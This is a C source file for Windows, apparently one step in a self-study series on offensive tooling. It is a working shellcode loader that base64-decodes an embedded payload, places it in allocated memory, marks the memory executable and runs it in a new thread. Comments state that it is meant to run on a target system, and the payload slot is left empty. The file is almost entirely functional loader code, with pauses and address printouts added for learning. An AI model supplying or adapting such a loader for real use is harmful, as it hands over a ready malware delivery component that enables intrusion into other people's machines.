// base example of shellcode loader with base64 decoding
// NOTE as opposed to 0001 - 0003 I no longer include error-handling
// I included it earlier to assist with any debugging
// but obvs since the intention is to run on a target system, error handling/messaging makes no sense


#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Wincrypt.h>
#pragma comment (lib, "Crypt32.lib")

// insert base64-encoded payload below
unsigned char encodedData[] = "";
unsigned int dataSize = sizeof(encodedData);

void pauseExecution(const char *note) {
    printf("%s\n", note);
    printf("hit enter to continue!\n");
    getchar();
}

int base64Decode( const BYTE * encodedSrc, unsigned int srcLength, char * decodedDest, unsigned int destLength ) {

    DWORD outputLength = destLength;
    // note CryptStringToBinary() will decrypt + save result to new buffer
    BOOL operationSuccess = CryptStringToBinary( (LPCSTR) encodedSrc, srcLength, CRYPT_STRING_BASE64, (BYTE *)decodedDest, &outputLength, NULL, NULL);

    if (!operationSuccess) outputLength = 0;

    return(outputLength);
}

int main(void) {

    HANDLE threadHandle;

    // Allocate new memory buffer for encoded data
    void * allocatedMem = VirtualAlloc(0, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // display addresses for learning purposes
    int pointerSizeHex = sizeof(void*) * 2;  // Calculate the width required for the pointer in hexadecimal
    printf("%-20s : 0x%0*p\n", "encoded data is stored at:", pointerSizeHex, (void *)encodedData);
    printf("%-20s : 0x%0*p\n", "memory allocated at:", pointerSizeHex, (void *)allocatedMem);

    pauseExecution("memory has been allocated");

    // custom function will decode encoded data and inject it
    base64Decode((const BYTE *)encodedData, dataSize, (char *) allocatedMem, dataSize);

    pauseExecution("shellcode has been decrypted + injected");

    // Make the buffer executable
    DWORD prevProtection = 0;
    BOOL protectResult = VirtualProtect(allocatedMem, dataSize, PAGE_EXECUTE_READ, &prevProtection);

    pauseExecution("memory protection constant has been changed");

    if (protectResult == 0) {
        return GetLastError();
    } else {
        HANDLE threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) allocatedMem, 0, 0, 0);
        WaitForSingleObject(threadHandle, -1);
        return 0;
    }

}
